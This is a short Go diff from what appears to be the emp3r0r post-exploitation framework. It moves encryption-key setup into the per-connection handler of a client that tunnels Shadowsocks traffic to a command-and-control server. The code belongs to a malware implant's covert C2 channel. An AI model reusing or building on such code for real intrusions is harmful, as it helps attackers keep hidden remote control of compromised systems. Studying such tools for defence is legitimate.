@@ -14,10 +14,6 @@ import (
 
 // Connect to C2 KCP server, forward Shadowsocks traffic
 func KCPClient() {
-	key := pbkdf2.Key([]byte(RuntimeConfig.ShadowsocksPassword),
-		[]byte(emp3r0r_data.MagicString), 1024, 32, sha256.New)
-	block, _ := kcp.NewAESBlockCrypt(key)
-
 	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%s", RuntimeConfig.KCPPort))
 	if err != nil {
 		log.Printf("KCPClient: %v", err)
@@ -29,6 +25,10 @@ func KCPClient() {
 
 	serve_conn := func(client_conn net.Conn) {
 		// dial to C2 KCP server
+		key := pbkdf2.Key([]byte(RuntimeConfig.ShadowsocksPassword),
+			[]byte(emp3r0r_data.MagicString), 1024, 32, sha256.New)
+		block, _ := kcp.NewAESBlockCrypt(key)
+
 		sess, err := kcp.DialWithOptions(fmt.Sprintf("%s:%s",
 			RuntimeConfig.CCHost, RuntimeConfig.KCPPort),
 			block, 10, 3)
